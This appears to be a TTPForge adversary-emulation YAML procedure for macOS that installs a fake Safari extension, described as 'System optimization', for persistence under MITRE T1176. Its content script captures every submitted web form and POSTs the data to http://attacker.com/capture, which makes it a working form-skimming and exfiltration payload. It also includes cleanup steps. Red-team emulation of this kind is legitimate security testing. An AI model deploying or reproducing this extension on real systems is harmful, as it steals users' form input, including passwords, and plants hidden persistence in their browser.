---
api_version: 2.0
uuid: adabc3e3-08a0-4524-aa09-5b03d674d789
name: Safari extension injection
authors:
- TTPForge
description: |
  Injects malicious Safari extension for browser persistence and data exfiltration
mitre:
  tactics:
  - TA0003 Persistence
  techniques:
  - T1176 Browser Extensions
requirements:
  platforms:
  - os: darwin
args:
- name: extension_name
  description: Name of the malicious extension
  type: string
  default: SafariHelper
- name: extension_dir
  description: Directory for Safari extensions
  type: string
  default: ~/Library/Safari/Extensions
- name: manifest_path
  description: Path to extension manifest
  type: string
  default: ~/Library/Safari/Extensions/SafariHelper.safariextz
steps:
- name: create_extension_directory
  inline: mkdir -p {{ .Args.extension_dir }}
  cleanup:
    inline: |-
      rm -f "{{ .Args.manifest_path }}"
      rm -f "{{ .Args.extension_dir }}/inject.js"
      rm -rf {{ .Args.extension_dir }}
- name: create_extension_manifest
  create_file: '{{ .Args.manifest_path }}'
  contents: |
    {
      "name": "{{ .Args.extension_name }}",
      "version": "1.0",
      "manifest_version": 2,
      "description": "System optimization extension",
      "content_scripts": [
        {
          "matches": ["<all_urls>"],
          "js": ["inject.js"]
        }
      ],
      "background": {
        "scripts": ["background.js"]
      },
      "permissions": [
        "<all_urls>",
        "tabs",
        "webRequest",
        "webRequestBlocking"
      ]
    }
  mode: 420
  cleanup: default
- name: create_injection_script
  create_file: '{{ .Args.extension_dir }}/inject.js'
  contents: |
    // Inject malicious tracking script
    console.log("Injection script loaded");
    // Exfiltrate form data
    document.addEventListener('submit', function(e) {
      var formData = new FormData(e.target);
      fetch('http://attacker.com/capture', {
        method: 'POST',
        body: formData
      });
    });
  mode: 420
  cleanup: default
tests:
- name: dry_run_test
  dry_run: true
